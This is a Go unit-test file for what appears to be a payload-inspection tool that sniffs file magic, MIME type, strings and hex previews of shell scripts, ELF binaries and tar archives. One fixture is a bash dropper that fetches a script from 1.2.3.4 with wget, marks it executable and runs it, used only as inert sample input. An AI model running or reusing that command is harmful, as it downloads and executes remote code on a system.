package payload

import (
	"archive/tar"
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeTemp(t *testing.T, name string, body []byte) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(p, body, 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestSniffShellScript(t *testing.T) {
	body := []byte("#!/bin/bash\nwget http://1.2.3.4/x.sh -O /tmp/x\nchmod +x /tmp/x\n/tmp/x\n")
	insp := File(writeTemp(t, "x.sh", body))
	if insp.Error != "" {
		t.Fatal(insp.Error)
	}
	if !strings.HasPrefix(insp.Magic, "shebang:") {
		t.Errorf("Magic=%q want shebang: prefix", insp.Magic)
	}
	if insp.MimeHint != "text/x-shellscript" {
		t.Errorf("MimeHint=%q", insp.MimeHint)
	}
	if len(insp.Strings) < 2 {
		t.Errorf("strings count=%d want >=2", len(insp.Strings))
	}
	if !strings.Contains(insp.HexPreview, "|#!/bin/bash") {
		t.Errorf("hex preview missing shebang ASCII column: %q", insp.HexPreview)
	}
}

func TestSniffELF(t *testing.T) {
	body := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, []byte("\x00\x00\x00\x00\x00\x00\x00\x00")...)
	// add some real-looking strings to make sure they get extracted
	body = append(body, []byte("/lib64/ld-linux-x86-64.so.2\x00GLIBC_2.2.5\x00")...)
	insp := File(writeTemp(t, "blob.bin", body))
	if insp.Error != "" {
		t.Fatal(insp.Error)
	}
	if insp.Magic != "ELF64" {
		t.Errorf("Magic=%q want ELF64", insp.Magic)
	}
	foundLD := false
	for _, s := range insp.Strings {
		if strings.Contains(s, "/lib64/ld-linux-x86-64.so.2") {
			foundLD = true
		}
	}
	if !foundLD {
		t.Errorf("ld string not surfaced: %+v", insp.Strings)
	}
}

func TestSniffTarUsesArchiveHeaderMagic(t *testing.T) {
	t.Parallel()
	formats := []struct {
		name   string
		format tar.Format
	}{
		{name: "POSIX", format: tar.FormatUSTAR},
		{name: "GNU", format: tar.FormatGNU},
	}
	for _, tc := range formats {
		t.Run(tc.name, func(t *testing.T) {
			var archive bytes.Buffer
			tw := tar.NewWriter(&archive)
			if err := tw.WriteHeader(&tar.Header{Name: "payload.bin", Mode: 0o600, Format: tc.format}); err != nil {
				t.Fatal(err)
			}
			if err := tw.Close(); err != nil {
				t.Fatal(err)
			}

			magic, mime := sniffMagic(archive.Bytes(), "archive.bin")
			if magic != "tar" || mime != "application/x-tar" {
				t.Fatalf("%s tar detected as (%q, %q), want (%q, %q)", tc.name, magic, mime, "tar", "application/x-tar")
			}
		})
	}
}

func TestSniffTarRejectsInvalidMagicTerminator(t *testing.T) {
	t.Parallel()
	buf := make([]byte, 263)
	copy(buf[257:263], "ustarX")
	magic, mime := sniffMagic(buf, "archive.bin")
	if magic == "tar" || mime == "application/x-tar" {
		t.Fatalf("invalid tar magic terminator detected as (%q, %q)", magic, mime)
	}
}

func TestSniffTarRejectsLeadingUstar(t *testing.T) {
	magic, mime := sniffMagic([]byte("ustar\x00"), "blob.bin")
	if magic == "tar" || mime == "application/x-tar" {
		t.Fatalf("leading ustar false positive detected as (%q, %q)", magic, mime)
	}
}

func TestMissingFile(t *testing.T) {
	insp := File("/nonexistent/path/does/not/exist")
	if insp.Error == "" {
		t.Errorf("expected error for missing file")
	}
	if insp.Magic != "" {
		t.Errorf("magic should not be inferred for missing file: %q", insp.Magic)
	}
}

func TestEmptyPath(t *testing.T) {
	insp := File("")
	if insp.Error == "" {
		t.Errorf("expected error for empty path")
	}
}
